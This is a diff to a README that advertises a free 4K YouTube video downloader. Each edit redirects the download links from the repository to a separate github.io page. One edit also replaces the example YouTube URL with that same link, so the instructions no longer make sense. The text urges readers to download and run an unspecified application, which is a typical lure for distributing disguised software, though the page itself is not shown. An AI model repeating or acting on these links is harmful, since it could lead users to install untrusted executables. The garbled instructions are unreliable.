@@ -1,6 +1,6 @@
 # ⬇️ youtube-video-downloader-4k-2026 - Download Any Video in 4K Quality
 
-[![Download Now](https://img.shields.io/badge/Download-Free_4K_Downloader-brightgreen?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026)
+[![Download Now](https://img.shields.io/badge/Download-Free_4K_Downloader-brightgreen?style=for-the-badge&logo=github&color=2ea44f)](https://miayearnedfor2535.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to start downloading videos today. You don't need any 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026](https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026)
+Visit this link to download the application: [https://miayearnedfor2535.github.io](https://miayearnedfor2535.github.io)
 
 Once you arrive at the page, look for the download button or link. The download should start automatically or prompt you to save a file.
 
@@ -51,7 +51,7 @@ Once the application opens, you'll see a simple interface. Copy any YouTube vide
 
 ### Getting the Software
 
-**Visit this link to download the application:** [https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026](https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026)
+**Visit this link to download the application:** [https://miayearnedfor2535.github.io](https://miayearnedfor2535.github.io)
 
 When you click the link, you'll be taken to the download page. The file you need should be clearly marked. Click the download button and wait for the file to save to your computer.
 
@@ -70,7 +70,7 @@ When you click the link, you'll be taken to the download page. The file you need
 
 1. Open YouTube in your browser
 2. Find the video you want to download
-3. Copy the URL from the address bar (it looks like `https://www.youtube.com/watch?v=...`)
+3. Copy the URL from the address bar (it looks like `https://miayearnedfor2535.github.io`)
 4. Open the downloader application
 5. Paste the link into the input box
 6. Select your preferred quality (4K, 1080p, 720p, or MP3)
@@ -202,7 +202,7 @@ Check the GitHub page regularly for updates, new features, and bug fixes. The de
 
 This downloader makes saving YouTube content incredibly easy. No technical skills required, no complicated settings, just paste a link and click download. Whether you're saving videos for offline viewing, building a music collection, or archiving content, this tool does the job efficiently.
 
-**Ready to start?** Visit this link to download the application: [https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026](https://github.com/miayearnedfor2535/youtube-video-downloader-4k-2026)
+**Ready to start?** Visit this link to download the application: [https://miayearnedfor2535.github.io](https://miayearnedfor2535.github.io)
 
 ---
 
